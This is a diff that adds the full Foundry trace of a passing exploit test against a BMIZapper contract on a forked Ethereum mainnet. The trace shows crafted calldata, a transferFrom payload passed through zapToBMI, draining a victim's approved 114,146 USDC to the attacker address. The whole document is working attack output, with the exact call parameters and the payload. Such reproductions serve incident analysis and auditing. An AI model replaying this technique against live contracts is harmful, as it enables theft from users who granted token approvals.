@@ -1,0 +1,194 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Bmizapper_exp.sol:ExploitTest
+[PASS] testExploit() (gas: 379562)
+Logs:
+  Victim's USDC balance before exploit: 114146.247097
+  Victim's USDC balance after exploit: 0.000000
+  Attacker's USDC balance after exploit: 114146.247097
+
+Traces:
+  [11809] ExploitTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 19029289 [1.902e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], "BMIZapper")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], "USDC")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [387162] ExploitTest::testExploit()
+    ├─ [9839] USDC::fallback(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d) [staticcall]
+    │   ├─ [2553] FiatTokenV2_2::balanceOf(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d) [delegatecall]
+    │   │   └─ ← [Return] 114146247097 [1.141e11]
+    │   └─ ← [Return] 114146247097 [1.141e11]
+    ├─ [3164] USDC::fallback() [staticcall]
+    │   ├─ [2381] FiatTokenV2_2::decimals() [delegatecall]
+    │   │   └─ ← [Return] 6
+    │   └─ ← [Return] 6
+    ├─ emit log_named_decimal_uint(key: "Victim's USDC balance before exploit", val: 114146247097 [1.141e11], decimals: 6)
+    ├─ [1339] USDC::fallback(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d) [staticcall]
+    │   ├─ [553] FiatTokenV2_2::balanceOf(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d) [delegatecall]
+    │   │   └─ ← [Return] 114146247097 [1.141e11]
+    │   └─ ← [Return] 114146247097 [1.141e11]
+    ├─ [333538] BMIZapper::zapToBMI(0x4Fabb145d64652a948d72533023f6E7A623C7C53, 0, 0x0000000000000000000000000000000000000000, 0, 0, [], [1000000000000000000 [1e18]], USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd00000000000000000000000007d7685becb1a72a1cf614b4067419334c9f1b4d0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000001a93a581b9, true)
+    │   ├─ [25020] 0x4Fabb145d64652a948d72533023f6E7A623C7C53::transferFrom(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0)
+    │   │   ├─ [17732] 0x2A3F1A37C04F82aA274f5353834B2d002Db91015::transferFrom(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [8045] 0x4Fabb145d64652a948d72533023f6E7A623C7C53::approve(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0)
+    │   │   ├─ [7263] 0x2A3F1A37C04F82aA274f5353834B2d002Db91015::approve(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0) [delegatecall]
+    │   │   │   ├─ emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [3945] 0x4Fabb145d64652a948d72533023f6E7A623C7C53::approve(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0)
+    │   │   ├─ [3163] 0x2A3F1A37C04F82aA274f5353834B2d002Db91015::approve(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0) [delegatecall]
+    │   │   │   ├─ emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [40049] USDC::fallback(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d, ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 114146247097 [1.141e11])
+    │   │   ├─ [39254] FiatTokenV2_2::transferFrom(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d, ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 114146247097 [1.141e11]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d, to: ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 114146247097 [1.141e11])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0 → 0x0000000000000000000000000000000000000000000000000000001a93a581b9
+    │   │   │   │   @ 0x0f1542cfd0d066631d2004faee557927d3a49ca18ede8cadf898414a6f3b319f: 0x0000000000000000000000000000000000000000000000000000001a93a581b9 → 0
+    │   │   │   │   @ 0xea295fdc51c3c7083cb05ea9b02f8d4cbae04106b9e6ec9b298c0f7699a5464f: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffff5396ef0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffe56193ed37
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [7439] Root::fallback() [staticcall]
+    │   │   ├─ [2433] Logic::totalSupply() [delegatecall]
+    │   │   │   └─ ← [Return] 258039016510113339064747 [2.58e23]
+    │   │   └─ ← [Return] 258039016510113339064747 [2.58e23]
+    │   ├─ [1339] USDC::fallback(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8]) [staticcall]
+    │   │   ├─ [553] FiatTokenV2_2::balanceOf(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8]) [delegatecall]
+    │   │   │   └─ ← [Return] 0
+    │   │   └─ ← [Return] 0
+    │   ├─ [213421] Root::fallback(0)
+    │   │   ├─ [212915] Logic::mint(0) [delegatecall]
+    │   │   │   ├─ [7451] 0x27b7b1ad7288079A66d12350c828D3C00A6F07d7::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [staticcall]
+    │   │   │   │   ├─ [4382] 0x986b4AFF588a109c09B50A03f42E4110E29D353F::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 13481963961123493925908 [1.348e22]
+    │   │   │   │   └─ ← [Return] 13481963961123493925908 [1.348e22]
+    │   │   │   ├─ [6571] 0xB4AdA607B9d6b2c9Ee07A275e9616B84AC560139::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [staticcall]
+    │   │   │   │   ├─ [3899] Vyper_contract::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 50444707592934502830323 [5.044e22]
+    │   │   │   │   └─ ← [Return] 50444707592934502830323 [5.044e22]
+    │   │   │   ├─ [4071] Vyper_contract::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [staticcall]
+    │   │   │   │   ├─ [3899] Vyper_contract::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 49062689600479175353702 [4.906e22]
+    │   │   │   │   └─ ← [Return] 49062689600479175353702 [4.906e22]
+    │   │   │   ├─ [4071] Vyper_contract::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [staticcall]
+    │   │   │   │   ├─ [3899] Vyper_contract::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 41260700541500909230127 [4.126e22]
+    │   │   │   │   └─ ← [Return] 41260700541500909230127 [4.126e22]
+    │   │   │   ├─ [4071] Vyper_contract::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [staticcall]
+    │   │   │   │   ├─ [3899] Vyper_contract::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 8590586891348196856470 [8.59e21]
+    │   │   │   │   └─ ← [Return] 8590586891348196856470 [8.59e21]
+    │   │   │   ├─ [4071] 0x5fA5B62c8AF877CB37031e0a3B2f34A78e3C56A6::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [staticcall]
+    │   │   │   │   ├─ [3899] Vyper_contract::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 49186395420842146362684 [4.918e22]
+    │   │   │   │   └─ ← [Return] 49186395420842146362684 [4.918e22]
+    │   │   │   ├─ [4071] 0x5a770DbD3Ee6bAF2802D29a901Ef11501C44797A::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [staticcall]
+    │   │   │   │   ├─ [3899] Vyper_contract::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 12625830812777963880156 [1.262e22]
+    │   │   │   │   └─ ← [Return] 12625830812777963880156 [1.262e22]
+    │   │   │   ├─ [4071] 0xC4dAf3b5e2A9e93861c3FBDd25f1e943B8D87417::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [staticcall]
+    │   │   │   │   ├─ [3899] Vyper_contract::balanceOf(Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 23665720835579771346300 [2.366e22]
+    │   │   │   │   └─ ← [Return] 23665720835579771346300 [2.366e22]
+    │   │   │   ├─ [10786] 0x27b7b1ad7288079A66d12350c828D3C00A6F07d7::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0)
+    │   │   │   │   ├─ [10211] 0x986b4AFF588a109c09B50A03f42E4110E29D353F::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0) [delegatecall]
+    │   │   │   │   │   ├─ emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 0)
+    │   │   │   │   │   ├─ emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [10274] 0xB4AdA607B9d6b2c9Ee07A275e9616B84AC560139::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0)
+    │   │   │   │   ├─ [10090] Vyper_contract::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0) [delegatecall]
+    │   │   │   │   │   ├─ emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 18493688277810584740 [1.849e19])
+    │   │   │   │   │   ├─ emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [10274] Vyper_contract::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0)
+    │   │   │   │   ├─ [10090] Vyper_contract::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0) [delegatecall]
+    │   │   │   │   │   ├─ emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 21629598650268911250 [2.162e19])
+    │   │   │   │   │   ├─ emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [10274] Vyper_contract::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0)
+    │   │   │   │   ├─ [10090] Vyper_contract::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0) [delegatecall]
+    │   │   │   │   │   ├─ emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 18811751683042529676 [1.881e19])
+    │   │   │   │   │   ├─ emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [10274] Vyper_contract::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0)
+    │   │   │   │   ├─ [10090] Vyper_contract::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0) [delegatecall]
+    │   │   │   │   │   ├─ emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 1976568631093460178 [1.976e18])
+    │   │   │   │   │   ├─ emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [10274] 0x5fA5B62c8AF877CB37031e0a3B2f34A78e3C56A6::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0)
+    │   │   │   │   ├─ [10090] Vyper_contract::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0) [delegatecall]
+    │   │   │   │   │   ├─ emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 71856 [7.185e4])
+    │   │   │   │   │   ├─ emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [10274] 0x5a770DbD3Ee6bAF2802D29a901Ef11501C44797A::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0)
+    │   │   │   │   ├─ [10090] Vyper_contract::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0) [delegatecall]
+    │   │   │   │   │   ├─ emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 18393722389832966266 [1.839e19])
+    │   │   │   │   │   ├─ emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [10274] 0xC4dAf3b5e2A9e93861c3FBDd25f1e943B8D87417::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0)
+    │   │   │   │   ├─ [10090] Vyper_contract::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], 0) [delegatecall]
+    │   │   │   │   │   ├─ emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 10384200177434297374 [1.038e19])
+    │   │   │   │   │   ├─ emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: Root: [0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x2bF3cC8Fa6F067cc1741c7467C8Ee9F00e837757, value: 0)
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], value: 0)
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return]
+    │   ├─ [1107] Root::fallback(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8]) [staticcall]
+    │   │   ├─ [598] Logic::balanceOf(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8]) [delegatecall]
+    │   │   │   └─ ← [Return] 0
+    │   │   └─ ← [Return] 0
+    │   ├─ [5922] Root::fallback(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   ├─ [5410] Logic::transfer(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [1339] USDC::fallback(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8]) [staticcall]
+    │   │   ├─ [553] FiatTokenV2_2::balanceOf(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8]) [delegatecall]
+    │   │   │   └─ ← [Return] 0
+    │   │   └─ ← [Return] 0
+    │   ├─ [5452] USDC::fallback(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   ├─ [4663] FiatTokenV2_2::transfer(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] 0
+    ├─ [1339] USDC::fallback(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d) [staticcall]
+    │   ├─ [553] FiatTokenV2_2::balanceOf(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [1164] USDC::fallback() [staticcall]
+    │   ├─ [381] FiatTokenV2_2::decimals() [delegatecall]
+    │   │   └─ ← [Return] 6
+    │   └─ ← [Return] 6
+    ├─ emit log_named_decimal_uint(key: "Victim's USDC balance after exploit", val: 0, decimals: 6)
+    ├─ [1339] USDC::fallback(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [553] FiatTokenV2_2::balanceOf(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 114146247097 [1.141e11]
+    │   └─ ← [Return] 114146247097 [1.141e11]
+    ├─ [1164] USDC::fallback() [staticcall]
+    │   ├─ [381] FiatTokenV2_2::decimals() [delegatecall]
+    │   │   └─ ← [Return] 6
+    │   └─ ← [Return] 6
+    ├─ emit log_named_decimal_uint(key: "Attacker's USDC balance after exploit", val: 114146247097 [1.141e11], decimals: 6)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 19.16s (17.81s CPU time)
+
+Ran 1 test suite in 22.56s (19.16s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
